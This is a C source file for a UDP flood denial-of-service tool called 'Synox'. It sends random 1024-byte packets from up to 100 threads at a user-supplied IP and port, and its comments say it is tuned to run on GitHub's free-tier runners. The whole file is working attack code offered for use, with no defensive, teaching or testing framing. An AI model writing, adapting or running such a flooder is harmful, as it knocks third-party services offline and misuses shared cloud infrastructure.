#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <errno.h>

// Synox: Optimized UDP Flood for GitHub Free Tier 4-Core - Max 100 Threads, Rate Limited

#define PACKET_SIZE 1024
#define MAX_THREADS 100  // Synox: Capped for 4-core free tier (avoid CPU/OOM crash)

volatile sig_atomic_t running = 1;

void sig_handler(int signo) {
    if (signo == SIGINT) {
        running = 0;
    }
}

void* flood_thread(void* arg) {
    char** args = (char**)arg;
    char* ip = args[0];
    int port = atoi(args[1]);
    int duration = atoi(args[2]);
    char buffer[PACKET_SIZE];
    struct sockaddr_in target;
    int sock = -1;
    time_t end_time = time(NULL) + duration;
    long sent = 0;

    // Seed random
    srand((unsigned int)(time(NULL) ^ getpid() ^ pthread_self()));

    // Random buffer
    for (int i = 0; i < PACKET_SIZE; i++) {
        buffer[i] = (char)(rand() % 256);
    }

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Synox: Socket fail");
        return NULL;
    }

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons((unsigned short)port);
    if (inet_pton(AF_INET, ip, &target.sin_addr) <= 0) {
        fprintf(stderr, "Synox: Invalid IP %s\n", ip);
        close(sock);
        return NULL;
    }

    printf("Synox Thread: Flood %s:%d started (Free Tier Optimized)\n", ip, port);

    while (running && (duration == 0 || time(NULL) < end_time)) {
        ssize_t bytes_sent = sendto(sock, buffer, PACKET_SIZE, 0, (struct sockaddr*)&target, sizeof(target));
        if (bytes_sent > 0) {
            sent += bytes_sent;
        } else if (errno != EINTR) {
            perror("Synox: Sendto fail");
            break;
        }
        usleep(500);  // Synox: Increased delay for free tier - ~2k pps/thread, CPU safe
        if (sent % 5000 == 0) {  // Progress every 5k
            printf("Synox: Thread sent ~%ld bytes\n", sent);
        }
    }

    close(sock);
    return NULL;
}

int main(int argc, char* argv[]) {
    if (argc != 6) {
        fprintf(stderr, "Synox Usage: %s <ip> <port> <duration> <threads> <flag>\n"
                        "Free Tier: Threads capped at %d for 4-core\n"
                        "Powered by @synox - Optimized for GitHub Free!\n", 
                argv[0], MAX_THREADS);
        return 1;
    }

    char* ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int requested_threads = atoi(argv[4]);
    (void)argv[5];  // Ignore flag

    // Synox: Cap threads for free tier
    int threads = (requested_threads > MAX_THREADS) ? MAX_THREADS : requested_threads;

    if (port <= 0 || port > 65535 || duration < 0 || threads <= 0) {
        fprintf(stderr, "Synox: Invalid params (threads capped to %d)\n", MAX_THREADS);
        return 1;
    }

    signal(SIGINT, sig_handler);

    printf("Synox C Attack (Free Tier): %s:%d for %ds, %d threads (capped %d)\n", 
           ip, port, duration, requested_threads, threads);

    pthread_t* thread_ids = malloc(sizeof(pthread_t) * threads);
    if (!thread_ids) {
        perror("Synox: Malloc fail");
        return 1;
    }

    char* thread_args[3] = {ip, argv[2], argv[3]};

    int active_threads = 0;
    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, flood_thread, thread_args) == 0) {
            active_threads++;
        } else {
            perror("Synox: Thread create fail");
        }
    }

    printf("Synox: Started %d/%d threads (Free Tier Safe)\n", active_threads, threads);

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Synox Attack finished - GG @synox! (Free Tier Optimized)\n");
    return 0;
}
